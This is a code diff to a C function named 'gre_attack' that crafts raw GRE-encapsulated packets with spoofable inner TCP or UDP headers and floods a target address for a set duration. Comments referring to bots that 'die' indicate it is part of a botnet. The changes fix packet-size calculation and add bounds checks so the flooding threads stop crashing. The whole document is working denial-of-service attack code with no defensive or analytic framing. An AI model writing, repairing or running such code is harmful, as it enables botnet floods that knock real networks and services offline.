@@ -30,14 +30,15 @@ void* gre_attack(void* arg) {
         close(sock);
         return NULL;
     }
-
-    int packet_size = params->psize > 0 ? params->psize : 32;
-    if (packet_size > 8192) packet_size = 8192;
-    
-    int min_size = sizeof(struct iphdr) + sizeof(struct grehdr);
+    // size correction here, found out why bots die
+    int min_size = sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr);  // Outer IP + GRE + Inner IP
     if (proto == IPPROTO_TCP) min_size += sizeof(struct tcphdr);
     else if (proto == IPPROTO_UDP) min_size += sizeof(struct udphdr);
+    // FIXED CRASH
+    // Auto size (need 48 least)
+    int packet_size = params->psize > 0 ? params->psize : min_size;
     if (packet_size < min_size) packet_size = min_size;
+    if (packet_size > 8192) packet_size = 8192;
 
     unsigned char *packet = calloc(1, packet_size);
     if (!packet) {
@@ -79,6 +80,11 @@ void* gre_attack(void* arg) {
     unsigned short src_port = params->srcport > 0 ? params->srcport : (rand() % 0xFFFF);
     if (proto == IPPROTO_TCP) {
         struct tcphdr *tcph = (struct tcphdr*)(inner_packet + sizeof(struct iphdr));
+        if ((unsigned char*)tcph + sizeof(struct tcphdr) > packet + packet_size) {
+            free(packet);
+            close(sock);
+            return NULL;
+        }
         tcph->source = htons(src_port);
         tcph->dest = params->target_addr.sin_port;
         tcph->seq = 0;
@@ -95,6 +101,11 @@ void* gre_attack(void* arg) {
         tcph->urg_ptr = 0;
     } else if (proto == IPPROTO_UDP) {
         struct udphdr *udph = (struct udphdr*)(inner_packet + sizeof(struct iphdr));
+        if ((unsigned char*)udph + sizeof(struct udphdr) > packet + packet_size) {
+            free(packet);
+            close(sock);
+            return NULL;
+        }
         udph->source = htons(src_port);
         udph->dest = params->target_addr.sin_port;
         udph->len = htons(packet_size - sizeof(struct iphdr) - sizeof(struct grehdr) - sizeof(struct iphdr));
@@ -102,45 +113,54 @@ void* gre_attack(void* arg) {
     }
 
     time_t end_time = time(NULL) + params->duration;
-    unsigned long packets_sent = 0;
-    
     while (params->active && time(NULL) < end_time) {
-        iph->id = htons((getpid() + packets_sent) & 0xFFFF);
-        inner_iph->id = htons((getpid() + packets_sent + 1) & 0xFFFF);
-        
+        iph->id = htons(getpid() & 0xFFFF);
+        inner_iph->id = htons((getpid() + 1) & 0xFFFF);
+
         unsigned short src_port = params->srcport > 0 ? params->srcport : (rand() % 0xFFFF);
         if (proto == IPPROTO_TCP) {
             struct tcphdr *tcph = (struct tcphdr*)(inner_packet + sizeof(struct iphdr));
+            int min_tcp_size = sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct tcphdr);
+            if ((unsigned char*)tcph + sizeof(struct tcphdr) > packet + packet_size || packet_size < min_tcp_size) {
+                break;
+            }
             tcph->source = htons(src_port);
-            tcph->seq = htonl(packets_sent);
+            tcph->seq = 0;
             tcph->check = 0;
             tcph->check = tcp_udp_checksum(tcph, ntohs(inner_iph->tot_len) - sizeof(struct iphdr),
                                          inner_iph->saddr, inner_iph->daddr, IPPROTO_TCP);
         } else if (proto == IPPROTO_UDP) {
             struct udphdr *udph = (struct udphdr*)(inner_packet + sizeof(struct iphdr));
+            int min_udp_size = sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr);
+            if ((unsigned char*)udph + sizeof(struct udphdr) > packet + packet_size || packet_size < min_udp_size) {
+                break;
+            }
             udph->source = htons(src_port);
             udph->check = 0;
             udph->check = tcp_udp_checksum(udph, ntohs(inner_iph->tot_len) - sizeof(struct iphdr),
                                          inner_iph->saddr, inner_iph->daddr, IPPROTO_UDP);
         }
 
+        if (packet_size < sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr)) {
+            break;
+        }
+
         inner_iph->check = 0;
         inner_iph->check = generic_checksum(inner_iph, sizeof(struct iphdr));
         
         greh->checksum = 0;
-        greh->reserved = htons(packets_sent & 0xFFFF);
+        greh->reserved = 0;
         greh->checksum = generic_checksum(greh, packet_size - sizeof(struct iphdr));
 
         iph->check = 0;
         iph->check = generic_checksum(iph, sizeof(struct iphdr));
 
-        if (sendto(sock, packet, packet_size, 0, 
-                  (struct sockaddr*)&params->target_addr, sizeof(params->target_addr)) > 0) {
-            packets_sent++;
-        }
+        sendto(sock, packet, packet_size, 0, 
+                  (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));
     }
 
     free(packet);
     close(sock);
-    return NULL;
+    params->active = 0;
+    return (void*)1;
 }
